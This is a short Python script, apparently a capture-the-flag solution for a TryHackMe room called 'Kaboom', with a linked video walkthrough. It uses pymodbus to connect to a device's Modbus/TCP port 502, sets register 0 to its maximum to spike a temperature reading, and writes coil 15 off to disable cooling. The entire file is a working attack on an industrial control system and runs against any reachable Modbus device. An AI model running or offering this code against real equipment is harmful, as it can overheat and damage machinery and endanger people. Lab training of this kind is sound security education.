# script by Claudi
# script for TryHackMe room Kaboom https://tryhackme.com/room/kaboom
# YouTube video walk through: https://youtu.be/C51Td99E8uk

from pymodbus.client import ModbusTcpClient
import sys

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=502)
connected = client.connect()
print(f"Connected: {connected}")

if not connected:
    print("Failed to connect. Exiting.")
    sys.exit(1)

try:
    # Step 1: Spike the temperature to max
    client.write_register(0, 65535)
    print("Register 0 written: temperature maxed")

    # Step 2: Kill the cooling system
    result = client.write_coil(15, False)
    print(f"Coil 15 written: cooling disabled → {result}")

except Exception as e:
    print(f"Error: {e}")

finally:
    client.close()
    print("Done.")
